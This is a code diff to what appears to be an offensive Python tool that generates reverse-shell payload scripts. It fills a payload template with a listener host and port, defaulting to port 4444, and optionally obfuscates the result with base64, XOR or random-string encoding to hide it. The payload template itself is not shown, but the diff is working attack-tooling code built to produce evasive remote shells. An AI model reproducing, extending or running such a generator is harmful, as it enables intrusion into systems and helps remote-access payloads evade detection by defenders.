@@ -39,13 +39,22 @@ def main():
         if args.payload.lower() == 'reverseshell':
             host = args.listen if args.listen else '0.0.0.0'
             port = args.port if args.port else 4444
+            if args.obfuscation == 'none':
                 with open('modules/payloads/rvs.txt', 'r') as f:
                     script = f.read()
+                script = script.replace('{HOST}', str(host)).replace('{PORT}', str(port))
                 with open(args.output, 'w') as f:
                     f.write(script)
                 print(f"[+] Script written to {args.output}")
             elif args.obfuscation in ('base64', 'xor', 'random', 'randomstring', 'random-string'):
-                obfuscate_reverse_shell(args.obfuscation, input_file='modules/payloads/rvs.txt', output_file=args.output)
+                with open('modules/payloads/rvs.txt', 'r') as f:
+                    script = f.read()
+                script = script.replace('{HOST}', str(host)).replace('{PORT}', str(port))
+                temp_input = 'modules/payloads/_temp_rvs.txt'
+                with open(temp_input, 'w') as f:
+                    f.write(script)
+                obfuscate_reverse_shell(args.obfuscation, input_file=temp_input, output_file=args.output)
+                os.remove(temp_input)
                 print(f"[+] Obfuscated script written to {args.output} using {args.obfuscation}")
             else:
                 print(f"[-] Unknown obfuscation method: {args.obfuscation}")
